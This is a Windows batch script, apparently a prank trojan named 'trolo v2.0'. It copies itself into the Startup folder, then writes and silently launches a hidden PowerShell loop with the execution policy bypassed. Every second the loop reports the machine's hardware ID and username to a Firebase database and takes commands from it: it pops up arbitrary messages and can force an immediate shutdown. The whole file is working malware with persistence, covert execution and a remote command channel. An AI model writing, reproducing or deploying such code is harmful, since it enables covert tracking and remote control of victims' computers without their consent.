@echo off
setlocal
@echo off
set "scriptPath=%~dpnx0"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy "%scriptPath%" "%startupFolder%" >nul
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
set PS_SCRIPT_PATH=%APPDATA%\trolo2\trolo2.ps1
if not exist "%APPDATA%\trolo2" mkdir "%APPDATA%\trolo2"
(
echo $hwid = ^(Get-WmiObject Win32_ComputerSystemProduct^).UUID
echo $username = $env:USERNAME
echo Add-Type -AssemblyName System.Windows.Forms
echo while ^($true^) {
echo try {
echo $response = Invoke-RestMethod -Uri "https://trolo-1252e-default-rtdb.firebaseio.com/main.json" -Method Get
echo if ^(-not $response^) {
echo Write-Output "Response is null or empty."
echo } elseif ^(-not ^($response.PSObject.Properties.Name -contains $hwid^)^) {
echo Write-Output "Response does not contain HWID key: $hwid"
echo $body = @{
echo $hwid = @{
echo username = $username
echo message = ""
echo }
echo } ^| ConvertTo-Json -Depth 3
echo Invoke-RestMethod -Uri "https://trolo-1252e-default-rtdb.firebaseio.com/main.json" -Method Patch -Body $body
echo } elseif ^(-not $response.$hwid.message -or $response.$hwid.message -eq ""^) {
echo } else {
echo if ^($respone.$hwid.message -eq "shutdownAll"^) {
echo shutdown.exe /s /t 0 /f
echo } else {
echo [System.Windows.Forms.MessageBox]::Show^(
echo $response.$hwid.message,
echo "trolo v2.0",
echo [System.Windows.Forms.MessageBoxButtons]::OK,
echo [System.Windows.Forms.MessageBoxIcon]::Information
echo ^)
echo }
echo $body = @{
echo username = $username
echo message = ""
echo } ^| ConvertTo-Json -Depth 3
echo $url = "https://trolo-1252e-default-rtdb.firebaseio.com/main/${hwid}.json"
echo Write-Output $url
echo Invoke-RestMethod -Uri $url -Method Patch -Body $body -ContentType "application/json"
echo }
echo } catch {
echo Write-Output "Exception caught: $_"
echo }
echo $body = @{
echo username = $username
echo ping = ^((Get-Date^).ToString^("o"^)^)
echo message = ""
echo } ^| ConvertTo-Json -Depth 3
echo Invoke-RestMethod -Uri "https://trolo-1252e-default-rtdb.firebaseio.com/main/$hwid.json" -Method Patch -Body $body -ContentType "application/json"
echo Start-Sleep -Seconds 1
echo }
) > "%PS_SCRIPT_PATH%"
powershell -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'powershell.exe' -ArgumentList '-ExecutionPolicy Bypass -File ""%PS_SCRIPT_PATH%""' -WindowStyle Hidden"

exit